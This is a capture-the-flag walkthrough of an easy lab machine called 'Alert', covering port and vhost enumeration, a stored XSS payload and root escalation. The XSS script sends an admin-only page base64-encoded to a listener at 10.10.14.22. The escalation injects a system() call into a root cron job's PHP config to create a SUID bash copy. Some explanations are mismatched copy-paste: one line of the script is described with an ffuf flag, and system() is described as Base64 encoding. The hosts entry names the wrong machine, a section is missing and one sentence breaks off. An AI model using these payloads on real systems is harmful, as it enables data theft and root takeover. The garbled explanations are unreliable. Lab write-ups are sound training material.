Level: Easy

1. Enumeration

I started with port enumeration:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44
  • -p- --open: Scans all ports and shows open ones.
  • -sS: SYN stealth scan.
  • -vvv: Maximum verbosity for real-time results.

Ports 22 (SSH) and 80 (HTTP) are open. Service scan:

nmap -sC -sV -p22,80 10.10.11.44
  • -sC: Runs default scripts.
  • -sV: Enumerates for the version running.

The domain is alert.htb. I updated my /etc/hosts:

echo "10.10.10.11 2million.htb" | sudo tee -a /etc/hosts

Next step is vhost enumeration:

ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10
  • -w ~/path/to/subdomain.txt: This is the wordlist that is used to start the fuzzing.
  • -fl: Exclude responses with a specific number of lines or range of lines.

Found a statistics subdomain that requires authentication.So I moved back to the main page.

2. Web Exploitation (XSS to LFI)

On the main site, the "Markdown Viewer" allows uploading .md files.

When I visited the "About Us" page I could see this message:

The administrator checks the contact messages at "Contact us".

So step by step we check our tabs. First we will check the uploading tab "Markdown Viewer". I sent a .md file which I created and after I got redirected the contents of the file was displayed.

This way I discovered it was vulnerable to XSS. I crafted a payload to leak messages.php

via the administrator's session:

<script> fetch('http://alert.htb/messages.php') .then(resp => resp.text()) .then(body => { fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body)); }) </script>
  • fetch('http://alert.htb/messages.php'):
    • This line makes an HTTP GET request to 'http://alert.htb/messages.php'.
    • It's attempting to retrieve the content of that page.
  • .then(resp => resp.text()): Exclude responses with a specific number of lines or range of lines.
    • It processes the response and converts it to plain text 'resp.text()', instead of JSON or binary.
    • 'body' will now contain the full HTML/text content returned by the page.
  • .then(body => { ... }): In this block, it takes the text content 'body'.
  • fetch("http://10.10.14.22:9200/exfil?body=": In this block, it takes the text content 'body'.
    • + btoa(body)): It encodes the content using 'btoa(body)' (Base64 encoding), so it can be safely included in a URL.
    • http://10.10.14.22:9200/: Next it sends this data to a remote server.
    • exfil?body=...: This is the exfiltration part — it leaks the content of `messages.php` to our listener.

Before continuing I checked the "visualizer.php" file where I read the source code CTRL+U and found out that the file was saved with a different name.

I found out that at "Contact Us" there is a form that I could fill

I set a listener and tried to see if there was any response.

Combining all the above I upload the script discussed as payload.md, open a listener and copy-paste the link from source code. http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md The admin will check the link and this will trigger the file which will send me the content of messages.php from the view of admin.

Decoding the data revealed a hidden file path:

4. Privilege Escalation

Using the id command, Albert is part of the management group. I found a writable configuration file used by a root cronjob:

find / -group management 2>/dev/null

I injected a command into /opt/website-monitor/config/configuration.php to create a SUID bash binary:

<?php define('PATH', '/opt/website-monitor'); system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); ?>
  • system: It encodes the content using 'btoa(body)' (Base64 encoding), so it can be safely included in a URL.
  • cp /bin/bash /tmp/damn: Copies the Bash shell to a temporary folder and renames it damn.
  • chown root:root /tmp/damn: Attempts to change the owner of that file to 'root'.
  • chmod 6777 /tmp/damn: Sets full access permissions (read/write/execute) for everyone.

After the cronjob ran, I executed the binary with -p to get root:

/tmp/damn -p
